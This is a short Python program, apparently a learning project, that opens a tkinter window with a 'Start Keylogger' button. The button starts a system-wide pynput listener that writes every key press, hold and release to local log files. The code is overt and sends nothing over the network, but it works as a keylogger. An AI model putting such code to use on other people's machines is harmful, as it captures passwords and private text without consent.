import tkinter as tk
from tkinter import *
from pynput import keyboard
import json
import threading

root = tk.Tk()
root.geometry("350x400")
root.title("Keylogger Project")

key_list = []
x = False
key_strokes = ""

# ---------- File Functions ----------

def update_txt_file(key):
    with open("logs.txt", "a", encoding="utf-8") as f:
        f.write(key)

def update_json_file(key_list):
    with open("log.json", "w", encoding="utf-8") as f:
        json.dump(key_list, f, indent=4)

# ---------- Keyboard Events ----------

def on_press(key):
    global x, key_list

    if not x:
        key_list.append({"Pressed": str(key)})
        x = True
    else:
        key_list.append({"Held": str(key)})

    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes

    key_list.append({"Released": str(key)})
    x = False

    update_json_file(key_list)

    key_strokes += str(key) + " "
    update_txt_file(str(key) + " ")

# ---------- Button Action ----------

def start_keylogger():
    print("[+] Keylogger Running")
    print("[!] Logs saved in logs.txt and log.json")

    listener = keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    )
    listener.start()

# ---------- GUI ----------

Label(root, text="Keylogger", font="Verdana 12 bold").pack(pady=20)
Button(root, text="Start Keylogger", command=start_keylogger).pack(pady=20)

root.mainloop()
